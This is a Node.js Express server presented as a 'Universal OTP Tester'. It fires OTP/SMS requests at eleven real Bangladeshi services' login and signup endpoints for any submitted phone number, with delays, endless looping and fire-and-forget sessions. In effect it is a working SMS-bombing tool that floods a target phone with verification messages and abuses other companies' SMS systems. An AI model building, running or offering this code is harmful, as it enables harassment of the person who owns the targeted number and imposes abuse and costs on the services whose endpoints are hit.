const express = require('express');
const fetch = (...args) => import('node-fetch').then(({ default: f }) => f(...args));
const { v4: uuidv4 } = require('uuid');

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── CORS - allow calls from anywhere ─────────────────────────────────────────
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// ── In-memory session store ───────────────────────────────────────────────────
const sessions = {};

// Auto-cleanup sessions older than 1 hour
setInterval(() => {
  const cutoff = Date.now() - 60 * 60 * 1000;
  for (const id in sessions) {
    if (new Date(sessions[id].started_at).getTime() < cutoff) delete sessions[id];
  }
}, 10 * 60 * 1000);

// ── Phone formatters ──────────────────────────────────────────────────────────
function toLocal(phone) {
  // → 01XXXXXXXXX
  let p = String(phone).replace(/\s+/g, '').replace(/^\+/, '');
  if (p.startsWith('880')) p = '0' + p.slice(3);
  if (!p.startsWith('0')) p = '0' + p;
  return p;
}
function to880(phone)     { return '880' + toLocal(phone).slice(1); }       // 8801XXXXXXXXX
function toPlus880(phone) { return '+' + to880(phone); }                    // +8801XXXXXXXXX
function toOsud(phone)    { return '+88-' + toLocal(phone); }               // +88-01XXXXXXXXX

// ── Sleep ─────────────────────────────────────────────────────────────────────
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ── 11 Templates ─────────────────────────────────────────────────────────────
const templates = [

  {
    id: 'sheba',
    name: 'Sheba BD',
    run: async (phone) => {
      const appId = '8329815A6D1AE6DD';
      // Step 1: get token
      const tRes = await fetch(
        `https://api-accounts.sheba.xyz/api/v1/accountkit/generate/token?app_id=${appId}`
      );
      const tData = await tRes.json();
      if (tData.code !== 200 || !tData.token)
        throw new Error('Token failed: ' + tData.message);
      // Step 2: shoot OTP
      const res = await fetch('https://accountkit.sheba.xyz/api/shoot-otp', {
        method: 'POST',
        headers: {
          'Accept': 'application/json, text/plain, */*',
          'Content-Type': 'application/json;charset=utf-8',
          'custom-headers': JSON.stringify({ 'portal-name': 'Customer Web' }),
        },
        body: JSON.stringify({ mobile: toPlus880(phone), app_id: appId, api_token: tData.token }),
      });
      const data = await res.json();
      if (data.message !== 'Good.') throw new Error(data.message);
      return { message: data.message, retry_after: data.can_retry_after };
    },
  },

  {
    id: 'arogga',
    name: 'Arogga',
    run: async (phone) => {
      const res = await fetch(
        'https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=139.0.0.0&os=Android&osv=10',
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `mobile=${encodeURIComponent(toLocal(phone))}&fcmToken=&referral=`,
        }
      );
      const data = await res.json();
      if (data.status !== 'success') throw new Error(data.message || 'Failed');
      return { message: data.message, otp_digits: data.data?.otpDigitCount };
    },
  },

  {
    id: 'gp',
    name: 'Grameenphone (GPFI)',
    run: async (phone) => {
      const res = await fetch('https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp', {
        method: 'POST',
        headers: {
          'Accept': 'application/json, text/plain, */*',
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ phone: toLocal(phone), email: '', language: 'en' }),
      });
      const data = await res.json();
      if (!data.status) throw new Error(data.data?.msg || 'Failed');
      return { message: data.data?.msg, validity_sec: data.data?.otpValidityTime };
    },
  },

  {
    id: 'banglalink',
    name: 'Banglalink WiFi',
    run: async (phone) => {
      const res = await fetch(
        'https://banglalinkwifi.banglalink.net/nexus/api/v1/auth/send-otp',
        {
          method: 'POST',
          headers: { 'accept': 'application/json', 'accept-language': 'en', 'content-type': 'application/json' },
          body: JSON.stringify({ msisdn: to880(phone) }),
        }
      );
      const data = await res.json();
      if (data.status !== 'success') throw new Error(data.message || 'Failed');
      return { message: data.message };
    },
  },

  {
    id: 'apex',
    name: 'Apex4u',
    run: async (phone) => {
      const res = await fetch('https://api.apex4u.com/api/auth/login', {
        method: 'POST',
        headers: { 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json' },
        body: JSON.stringify({ phoneNumber: toLocal(phone) }),
      });
      const data = await res.json();
      if (!data.OtpExist) throw new Error('OTP not triggered');
      return { otp_exist: data.OtpExist, user_exists: data.UserExist, expiry: data.ExpiryTime };
    },
  },

  {
    id: 'osudpotro',
    name: 'Osudpotro',
    run: async (phone) => {
      const res = await fetch('https://api.osudpotro.com/api/v1/users/send_otp', {
        method: 'POST',
        headers: {
          'Accept': 'application/json, text/plain, */*',
          'Content-Type': 'application/json;charset=utf-8',
        },
        body: JSON.stringify({ mobile: toOsud(phone), deviceToken: 'web', language: 'en', os: 'web' }),
      });
      const data = await res.json();
      if (!data.status) throw new Error(data.message || 'Failed');
      return { message: data.message, otp_time_limit: data.data?.otp_time_limit };
    },
  },

  {
    id: 'bioscope',
    name: 'Bioscope',
    run: async (phone) => {
      const res = await fetch(
        'https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en',
        {
          method: 'POST',
          headers: { 'Accept': 'application/json', 'Content-Type': 'application/json', 'Authorization': '' },
          body: JSON.stringify({ number: toPlus880(phone) }),
        }
      );
      const data = await res.json();
      if (!data.success) throw new Error(data.message || 'Failed');
      return { message: data.message };
    },
  },

  {
    id: 'ghoori',
    name: 'Ghoori Learning',
    run: async (phone) => {
      const res = await fetch(
        'https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web',
        {
          method: 'POST',
          headers: { 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json' },
          body: JSON.stringify({ mobile_no: toLocal(phone) }),
        }
      );
      const data = await res.json();
      if (!data.message) throw new Error('No response');
      return { message: data.message };
    },
  },

  {
    id: 'applink',
    name: 'Applink BD',
    run: async (phone) => {
      const res = await fetch('https://applink.com.bd/appstore-v4-server/login/otp/request', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ msisdn: to880(phone) }),
      });
      const data = await res.json();
      if (data.statusCode !== 'S1000') throw new Error(data.statusMessage || 'Failed');
      return { message: data.statusMessage, request_id: data.payload?.requestId };
    },
  },

  {
    id: 'singer',
    name: 'Singer BD',
    run: async (phone) => {
      const res = await fetch('https://www.singerbd.com/api/auth/otp/login', {
        method: 'POST',
        headers: {
          'Accept': 'application/json, text/plain, */*',
          'Content-Type': 'application/json',
          'x-api-key': '1234',
          'x-from-service': 'web',
        },
        body: JSON.stringify({ login: toPlus880(phone) }),
      });
      const data = await res.json();
      if (!data.message) throw new Error('No response');
      return { message: data.message, resend_after: data.details?.resendAfter };
    },
  },

  {
    id: 'shwapno',
    name: 'Shwapno',
    run: async (phone) => {
      const res = await fetch('https://www.shwapno.com/api/auth', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ phoneNumber: toPlus880(phone) }),
      });
      const data = await res.json();
      if (!data.phoneNumber) throw new Error(data.message || 'Failed');
      return { phone: data.phoneNumber, max_attempts: data.maxAttemptsPerHour, buffer_time: data.otpBufferTime };
    },
  },

];

// ── Background session runner ──────────────────────────────────────────────────
async function runSession(sessionId, phone, options) {
  const session = sessions[sessionId];
  const { delay, loop, loop_delay } = options;

  do {
    if (session.loop_count > 1) {
      session.status = 'waiting_loop';
      session.next_loop_at = new Date(Date.now() + loop_delay * 1000).toISOString();
      await sleep(loop_delay * 1000);
      session.results = [];
      session.completed = 0;
      session.next_loop_at = null;
    }

    session.status = 'running';

    for (let i = 0; i < templates.length; i++) {
      if (session.cancelled) { session.status = 'cancelled'; return; }

      const t = templates[i];
      const result = {
        id: t.id,
        name: t.name,
        status: 'running',
        data: null,
        error: null,
        started_at: new Date().toISOString(),
        finished_at: null,
      };
      session.results.push(result);
      session.current = t.name;

      try {
        result.data = await t.run(phone);
        result.status = 'success';
      } catch (err) {
        result.status = 'failed';
        result.error = err.message;
      }

      result.finished_at = new Date().toISOString();
      session.completed++;

      if (i < templates.length - 1) {
        session.next_template_at = new Date(Date.now() + delay * 1000).toISOString();
        await sleep(delay * 1000);
        session.next_template_at = null;
      }
    }

    session.current = null;

    if (loop && !session.cancelled) {
      session.loop_count++;
    } else {
      session.status = 'done';
      session.finished_at = new Date().toISOString();
    }

  } while (loop && !session.cancelled);
}

// ── Routes ────────────────────────────────────────────────────────────────────

app.get('/', (req, res) => {
  res.json({
    service: '🔐 Universal OTP Tester',
    status: 'running',
    total_templates: templates.length,
    templates: templates.map((t) => ({ id: t.id, name: t.name })),
    usage: {
      endpoint: 'POST /send-otp',
      required: { phone: '01XXXXXXXXX' },
      optional: {
        delay: 'seconds between each template (default: 4)',
        loop: 'repeat forever after finishing (default: false)',
        loop_delay: 'seconds before looping again (default: 60)',
      },
      example_minimal: { phone: '01761387516' },
      example_full: { phone: '01761387516', delay: 5, loop: true, loop_delay: 120 },
    },
    other_endpoints: {
      'GET /status/:session_id': 'Live session status',
      'POST /cancel/:session_id': 'Cancel running/looping session',
      'GET /sessions': 'List all sessions',
    },
  });
});

// ─── MAIN SINGLE ENDPOINT ────────────────────────────────────────────────────
app.post('/send-otp', (req, res) => {
  const { phone, delay, loop, loop_delay } = req.body;

  if (!phone) {
    return res.status(400).json({
      error: 'phone is required',
      example: { phone: '01761387516' },
    });
  }

  const options = {
    delay:      typeof delay === 'number'      ? delay      : 4,
    loop:       loop === true,
    loop_delay: typeof loop_delay === 'number' ? loop_delay : 60,
  };

  const sessionId = uuidv4();
  sessions[sessionId] = {
    session_id:       sessionId,
    phone,
    status:           'running',
    current:          null,
    next_template_at: null,
    next_loop_at:     null,
    loop_count:       1,
    completed:        0,
    total:            templates.length,
    options,
    results:          [],
    cancelled:        false,
    started_at:       new Date().toISOString(),
    finished_at:      null,
  };

  // 🔥 Fire and forget - keeps running even if client disconnects
  runSession(sessionId, phone, options).catch((err) => {
    if (sessions[sessionId]) {
      sessions[sessionId].status = 'error';
      sessions[sessionId].error = err.message;
    }
  });

  return res.status(202).json({
    success:         true,
    session_id:      sessionId,
    phone,
    message:         `Session started for ${phone} — running ${templates.length} templates`,
    total_templates: templates.length,
    options,
    status_url:      `/status/${sessionId}`,
    cancel_url:      `/cancel/${sessionId}`,
  });
});

app.get('/status/:sessionId', (req, res) => {
  const session = sessions[req.params.sessionId];
  if (!session) return res.status(404).json({ error: 'Session not found' });
  res.json(session);
});

app.post('/cancel/:sessionId', (req, res) => {
  const session = sessions[req.params.sessionId];
  if (!session) return res.status(404).json({ error: 'Session not found' });
  if (['done', 'cancelled'].includes(session.status))
    return res.json({ message: `Session already ${session.status}` });
  session.cancelled = true;
  res.json({ success: true, message: 'Session will be cancelled after current template finishes' });
});

app.get('/sessions', (req, res) => {
  const list = Object.values(sessions).map((s) => ({
    session_id:  s.session_id,
    phone:       s.phone,
    status:      s.status,
    current:     s.current,
    progress:    `${s.completed}/${s.total}`,
    loop_count:  s.loop_count,
    options:     s.options,
    started_at:  s.started_at,
    finished_at: s.finished_at,
  }));
  res.json({ total: list.length, sessions: list });
});

// ── Start ─────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`\n🔥 OTP Tester running on port ${PORT}`);
  console.log(`📋 ${templates.length} templates loaded`);
  console.log(`➡  POST /send-otp  { phone, delay?, loop?, loop_delay? }\n`);
});
